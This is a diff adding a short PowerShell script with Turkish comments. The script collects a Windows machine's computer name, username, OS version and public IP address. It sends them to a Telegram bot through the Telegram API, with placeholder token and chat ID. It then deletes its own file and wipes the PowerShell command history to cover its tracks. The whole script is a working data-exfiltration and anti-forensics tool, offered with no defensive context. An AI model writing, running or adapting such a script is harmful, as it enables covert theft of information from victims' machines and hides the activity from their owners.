@@ -1,0 +1,27 @@
+# Bilgi toplama
+$pcName = $env:COMPUTERNAME
+$user = $env:USERNAME
+$os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+$ip = (Invoke-RestMethod ipinfo.io).ip
+
+# Telegram bilgileri
+$token = "YOUR_BOT_TOKEN"
+$chatId = "YOUR_CHAT_ID"
+
+# Mesajı oluştur
+$msg = "✅ Bilgi Alındı:`n💻 PC: $pcName`n👤 Kullanıcı: $user`n🖥 OS: $os`n🌍 IP: $ip"
+
+# Mesajı gönder
+Invoke-WebRequest -Uri "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$msg"
+
+# 📁 Geçici script dosyasını sil
+$myPath = $MyInvocation.MyCommand.Path
+if (Test-Path $myPath) {
+    Remove-Item $myPath -Force -ErrorAction SilentlyContinue
+}
+
+# 🧹 PowerShell geçmişini sil
+$psHist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $psHist) {
+    Remove-Item $psHist -Force -ErrorAction SilentlyContinue
+}
